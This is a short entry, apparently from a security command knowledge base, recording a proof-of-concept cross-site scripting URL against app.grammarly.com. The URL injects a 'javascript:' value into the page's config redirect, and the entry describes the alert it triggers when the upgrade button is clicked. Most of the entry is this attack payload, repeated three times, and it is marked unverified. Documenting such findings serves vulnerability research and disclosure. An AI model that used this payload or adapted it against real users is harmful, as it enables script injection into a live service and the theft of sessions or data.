---
data: >-
  https://app.grammarly.com/?config={%22api%22:{%22redirect%22:%22javascript:alert(document.domain)//%22}}
tags:
  - xss
  - poc
  - grammarly
type: command
executor: bash
platforms:
  - Web
id: 8bdffc2a-cab4-4216-b1e0-4b0e0b73c94b
created_at: '2025-12-13T23:56:20.267Z'
updated_at: '2025-12-13T23:56:20.267Z'
verified: false
validated: true
submitted: true
---
# grammarly-xss-poc-main-page

## Command

```bash
https://app.grammarly.com/?config={%22api%22:{%22redirect%22:%22javascript:alert(document.domain)//%22}}
```

## Description

PoC URL to inject XSS payload into main page config, overriding api.redirect.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `config` | JSON object overriding api.redirect to javascript:alert | Yes |

## Examples

### Basic Usage

```bash
https://app.grammarly.com/?config={%22api%22:{%22redirect%22:%22javascript:alert(document.domain)//%22}}
```

## Expected Output

Triggers alert(document.domain) when clicking upgrade on main page.

## Related

- [[procedures/Craft-PoC-URLs-for-Config-Injection]]
- [[procedures/Trigger-XSS-via-Affected-Features]]
